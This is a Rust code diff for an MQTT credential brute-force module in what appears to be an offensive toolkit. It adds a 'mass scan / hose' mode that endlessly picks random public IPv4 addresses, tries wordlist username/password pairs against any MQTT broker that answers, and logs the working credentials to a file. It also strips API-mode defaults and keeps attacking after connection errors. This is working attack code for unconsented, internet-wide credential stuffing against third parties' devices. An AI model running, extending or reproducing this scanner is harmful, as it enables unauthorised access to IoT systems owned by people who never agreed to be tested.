@@ -9,12 +9,15 @@
 
 use anyhow::{anyhow, Context, Result};
 use colored::*;
+use rand::Rng;
 use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
 use std::sync::Arc;
+use std::net::{IpAddr, Ipv4Addr, SocketAddr};
 use std::time::Duration;
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use tokio::net::TcpStream;
 use tokio::sync::{Mutex, Semaphore};
+use tokio::fs::OpenOptions;
 use futures::stream::{FuturesUnordered, StreamExt};
 
 use crate::utils::{
@@ -30,6 +33,21 @@ use crate::modules::creds::utils::BruteforceStats;
 const MQTT_CONNECT_TIMEOUT_MS: u64 = 5000;
 const MQTT_READ_TIMEOUT_MS: u64 = 3000;
 const PROGRESS_INTERVAL_SECS: u64 = 2;
+const MASS_SCAN_CONNECT_TIMEOUT_MS: u64 = 3000;
+const STATE_FILE: &str = "mqtt_brute_hose_state.log";
+
+// Hardcoded exclusions for mass scan
+const EXCLUDED_RANGES: &[&str] = &[
+    "10.0.0.0/8", "127.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16",
+    "224.0.0.0/4", "240.0.0.0/4", "0.0.0.0/8",
+    "100.64.0.0/10", "169.254.0.0/16", "255.255.255.255/32",
+    "103.21.244.0/22", "103.22.200.0/22", "103.31.4.0/22", "104.16.0.0/13",
+    "104.24.0.0/14", "108.162.192.0/18", "131.0.72.0/22", "141.101.64.0/18",
+    "162.158.0.0/15", "172.64.0.0/13", "173.245.48.0/20", "188.114.96.0/20",
+    "190.93.240.0/20", "197.234.240.0/22", "198.41.128.0/17",
+    "1.1.1.1/32", "1.0.0.1/32",
+    "8.8.8.8/32", "8.8.4.4/32"
+];
 
 // MQTT Protocol Constants
 const MQTT_PACKET_CONNECT: u8 = 0x10;
@@ -120,42 +138,44 @@ enum AttackResult {
 
 pub async fn run(target: &str) -> Result<()> {
     display_banner();
-    
+
+    // Check for Mass Scan Mode
+    let is_mass_scan = target == "random" || target == "0.0.0.0" || target == "0.0.0.0/0" || std::path::Path::new(target).is_file();
+
+    if is_mass_scan {
+        println!("{}", format!("[*] Target: {}", target).cyan());
+        println!("{}", "[*] Mode: Mass Scan / Hose".yellow());
+        return run_mass_scan(target).await;
+    }
+
     let normalized_target = normalize_target(&target.to_string())?;
     println!("{}", format!("[*] Target: {}", normalized_target).cyan());
     println!();
 
     // Check for API-provided config
     let config_api = crate::config::get_module_config();
-    let api_mode = config_api.is_api_mode();
 
     // Configuration
     let port = if let Some(p) = config_api.port {
         p
-    } else if api_mode {
-        1883
     } else {
         prompt_int_range("MQTT Port (1883/8883)", 1883, 1, 65535)? as u16
     };
     
-    let use_tls = if api_mode {
-        port == 8883
-    } else if port == 8883 {
+    let use_tls = if port == 8883 {
         println!("{}", "[*] Port 8883 detected - TLS enabled by default".blue());
         true
     } else {
         prompt_yes_no("Use TLS/SSL?", false)?
     };
 
-    let test_anonymous = if api_mode { false } else { prompt_yes_no("Test anonymous authentication first?", true)? };
+    let test_anonymous = prompt_yes_no("Test anonymous authentication first?", true)?;
     
     let username_wordlist = if let Some(ref f) = config_api.username_wordlist {
         if !std::path::Path::new(f).exists() {
             return Err(anyhow!("Username wordlist not found: {}", f));
         }
         f.clone()
-    } else if api_mode {
-        return Err(anyhow!("Username wordlist required for API mode"));
     } else {
         prompt_existing_file("Username wordlist file")?
     };
@@ -165,25 +185,23 @@ pub async fn run(target: &str) -> Result<()> {
             return Err(anyhow!("Password wordlist not found: {}", f));
         }
         f.clone()
-    } else if api_mode {
-        return Err(anyhow!("Password wordlist required for API mode"));
     } else {
         prompt_existing_file("Password wordlist file")?
     };
     
     let threads = config_api.concurrency.unwrap_or_else(|| {
-        if api_mode { 10 } else { prompt_int_range("Concurrent connections", 10, 1, 500).unwrap_or(10) as usize }
+        prompt_int_range("Concurrent connections", 10, 1, 500).unwrap_or(10) as usize
     });
     let stop_on_success = config_api.stop_on_success.unwrap_or_else(|| {
-        if api_mode { true } else { prompt_yes_no("Stop on first valid login?", true).unwrap_or(true) }
+        prompt_yes_no("Stop on first valid login?", true).unwrap_or(true)
     });
     let full_combo = config_api.combo_mode.unwrap_or_else(|| {
-        if api_mode { false } else { prompt_yes_no("Full combination mode (user × pass)?", false).unwrap_or(false) }
+        prompt_yes_no("Full combination mode (user × pass)?", false).unwrap_or(false)
     });
     let verbose = config_api.verbose.unwrap_or_else(|| {
-        if api_mode { false } else { prompt_yes_no("Verbose output?", false).unwrap_or(false) }
+        prompt_yes_no("Verbose output?", false).unwrap_or(false)
     });
-    let client_id = if api_mode { "rustsploit_mqtt".to_string() } else { prompt_default("MQTT Client ID", "rustsploit_mqtt")? };
+    let client_id = prompt_default("MQTT Client ID", "rustsploit_mqtt")?;
 
     let config = MqttConfig {
         target: normalized_target,
@@ -265,8 +283,8 @@ async fn run_bruteforce(
                 println!("{}", "[-] Anonymous access denied (authentication required)".yellow());
             }
             AttackResult::ConnectionError(e) => {
-                println!("{}", format!("[!] Connection error: {}", e).red());
-                return Err(anyhow!("Cannot connect to MQTT broker: {}", e));
+                println!("{}", format!("[!] Connection error during anonymous test: {}", e).yellow());
+                println!("{}", "[*] Continuing with credential brute force...".blue());
             }
             AttackResult::ProtocolError(e) => {
                 println!("{}", format!("[!] Protocol error: {}", e).yellow());
@@ -602,4 +620,227 @@ fn encode_remaining_length(mut length: usize) -> Result<Vec<u8>> {
         }
     }
     Ok(bytes)
+}
+
+// ============================================================================
+// Mass Scan Implementation
+// ============================================================================
+
+async fn run_mass_scan(target: &str) -> Result<()> {
+    let port = prompt_int_range("MQTT Port (1883/8883)", 1883, 1, 65535)? as u16;
+    let use_tls = if port == 8883 {
+        println!("{}", "[*] Port 8883 detected - TLS enabled by default".blue());
+        true
+    } else {
+        prompt_yes_no("Use TLS/SSL?", false)?
+    };
+
+    let username_wordlist = prompt_existing_file("Username wordlist file")?;
+    let password_wordlist = prompt_existing_file("Password wordlist file")?;
+
+    let users = load_lines(&username_wordlist)?;
+    let passes = load_lines(&password_wordlist)?;
+
+    if users.is_empty() { return Err(anyhow!("User list empty")); }
+    if passes.is_empty() { return Err(anyhow!("Pass list empty")); }
+
+    let concurrency = prompt_int_range("Max concurrent hosts to scan", 500, 1, 10000)? as usize;
+    let verbose = prompt_yes_no("Verbose mode?", false)?;
+    let output_file = prompt_default("Output result file", "mqtt_brute_mass_results.txt")?;
+    let client_id = prompt_default("MQTT Client ID", "rustsploit_mqtt")?;
+
+    let use_exclusions = prompt_yes_no("Exclude reserved/private ranges?", true)?;
+
+    let mut exclusion_subnets = Vec::new();
+    if use_exclusions {
+        for cidr in EXCLUDED_RANGES {
+            if let Ok(net) = cidr.parse::<ipnetwork::IpNetwork>() {
+                exclusion_subnets.push(net);
+            }
+        }
+        println!("{}", format!("[+] Loaded {} exclusion ranges", exclusion_subnets.len()).cyan());
+    }
+    let exclusions = Arc::new(exclusion_subnets);
+
+    let semaphore = Arc::new(Semaphore::new(concurrency));
+    let stats_checked = Arc::new(AtomicUsize::new(0));
+    let stats_found = Arc::new(AtomicUsize::new(0));
+
+    let creds_pkg = Arc::new((users, passes));
+
+    // Stats reporter
+    let s_checked = stats_checked.clone();
+    let s_found = stats_found.clone();
+    tokio::spawn(async move {
+        loop {
+            tokio::time::sleep(Duration::from_secs(5)).await;
+            println!(
+                "[*] Status: {} IPs scanned, {} valid credentials found",
+                s_checked.load(Ordering::Relaxed),
+                s_found.load(Ordering::Relaxed).to_string().green().bold()
+            );
+        }
+    });
+
+    let run_random = target == "random" || target == "0.0.0.0" || target == "0.0.0.0/0";
+
+    if run_random {
+        // Initialize state file
+        OpenOptions::new().create(true).write(true).open(STATE_FILE).await?;
+
+        println!("{}", "[*] Starting Random Internet MQTT Scan...".green());
+        loop {
+            let permit = semaphore.clone().acquire_owned().await.context("Semaphore acquisition failed")?;
+            let exc = exclusions.clone();
+            let cp = creds_pkg.clone();
+            let sc = stats_checked.clone();
+            let sf = stats_found.clone();
+            let of = output_file.clone();
+            let cid = client_id.clone();
+
+            tokio::spawn(async move {
+                let ip = generate_random_public_ip(&exc);
+                if !is_ip_checked(&ip).await {
+                    mark_ip_checked(&ip).await;
+                    mass_scan_host(ip, port, use_tls, &cid, cp, sf, of, verbose).await;
+                }
+                sc.fetch_add(1, Ordering::Relaxed);
+                drop(permit);
+            });
+        }
+    } else {
+        // File Mode
+        let content = match tokio::fs::read_to_string(target).await {
+            Ok(c) => c,
+            Err(e) => {
+                println!("{}", format!("[!] Failed to read target file: {}", e).red());
+                return Ok(());
+            }
+        };
+        let lines: Vec<String> = content.lines().map(|s| s.trim().to_string()).filter(|s| !s.is_empty()).collect();
+        println!("{}", format!("[*] Loaded {} targets from file.", lines.len()).blue());
+
+        for ip_str in lines {
+            let permit = semaphore.clone().acquire_owned().await.context("Semaphore acquisition failed")?;
+            let cp = creds_pkg.clone();
+            let sc = stats_checked.clone();
+            let sf = stats_found.clone();
+            let of = output_file.clone();
+            let cid = client_id.clone();
+
+            if let Ok(ip) = ip_str.parse::<IpAddr>() {
+                tokio::spawn(async move {
+                    if !is_ip_checked(&ip).await {
+                        mark_ip_checked(&ip).await;
+                        mass_scan_host(ip, port, use_tls, &cid, cp, sf, of, verbose).await;
+                    }
+                    sc.fetch_add(1, Ordering::Relaxed);
+                    drop(permit);
+                });
+            } else {
+                drop(permit);
+            }
+        }
+        // Wait for all tasks to complete
+        for _ in 0..concurrency {
+            let _ = semaphore.acquire().await.context("Semaphore acquisition failed")?;
+        }
+    }
+
+    Ok(())
+}
+
+async fn mass_scan_host(
+    ip: IpAddr,
+    port: u16,
+    use_tls: bool,
+    client_id: &str,
+    creds: Arc<(Vec<String>, Vec<String>)>,
+    stats_found: Arc<AtomicUsize>,
+    output_file: String,
+    verbose: bool,
+) {
+    let sa = SocketAddr::new(ip, port);
+
+    // 1. Connection Check - verify port is open
+    if tokio::time::timeout(
+        Duration::from_millis(MASS_SCAN_CONNECT_TIMEOUT_MS),
+        TcpStream::connect(&sa),
+    ).await.is_err() {
+        return;
+    }
+
+    let (users, passes) = &*creds;
+    let addr = format!("{}:{}", ip, port);
+
+    // 2. Brute force against this host
+    for user in users {
+        for pass in passes {
+            match try_mqtt_auth(&addr, user, pass, client_id, use_tls).await {
+                AttackResult::Success(u, p) => {
+                    let msg = format!("{}:{}:{}:{}", ip, port, u, p);
+                    println!("\r{}", format!("[+] FOUND: {}", msg).green().bold());
+                    if let Ok(mut file) = OpenOptions::new().create(true).append(true).open(&output_file).await {
+                        let _ = file.write_all(format!("{}\n", msg).as_bytes()).await;
+                    }
+                    stats_found.fetch_add(1, Ordering::Relaxed);
+                    return; // Stop after first success on this host
+                }
+                AttackResult::AuthFailed => {
+                    if verbose {
+                        println!("\r{}", format!("[-] {} -> {}:{}", addr, user, pass).dimmed());
+                    }
+                }
+                AttackResult::ConnectionError(e) => {
+                    let err = e.to_lowercase();
+                    if err.contains("refused") || err.contains("timeout") || err.contains("reset") {
+                        return; // Host is dead or blocked
+                    }
+                }
+                AttackResult::ProtocolError(_) => {
+                    // Continue trying
+                }
+            }
+        }
+    }
+}
+
+fn generate_random_public_ip(exclusions: &[ipnetwork::IpNetwork]) -> IpAddr {
+    let mut rng = rand::rng();
+    loop {
+        let octets: [u8; 4] = rng.random();
+        let ip = Ipv4Addr::from(octets);
+        let ip_addr = IpAddr::V4(ip);
+        let mut excluded = false;
+        for net in exclusions {
+            if net.contains(ip_addr) {
+                excluded = true;
+                break;
+            }
+        }
+        if !excluded { return ip_addr; }
+    }
+}
+
+async fn is_ip_checked(ip: &impl ToString) -> bool {
+    if !std::path::Path::new(STATE_FILE).exists() {
+        return false;
+    }
+    let ip_s = ip.to_string();
+    let status = tokio::process::Command::new("grep")
+        .arg("-F")
+        .arg("-q")
+        .arg(format!("checked: {}", ip_s))
+        .arg(STATE_FILE)
+        .stderr(std::process::Stdio::null())
+        .status()
+        .await;
+    match status { Ok(s) => s.success(), Err(_) => false }
+}
+
+async fn mark_ip_checked(ip: &impl ToString) {
+    let data = format!("checked: {}\n", ip.to_string());
+    if let Ok(mut file) = OpenOptions::new().create(true).append(true).open(STATE_FILE).await {
+        let _ = file.write_all(data.as_bytes()).await;
+    }
 }
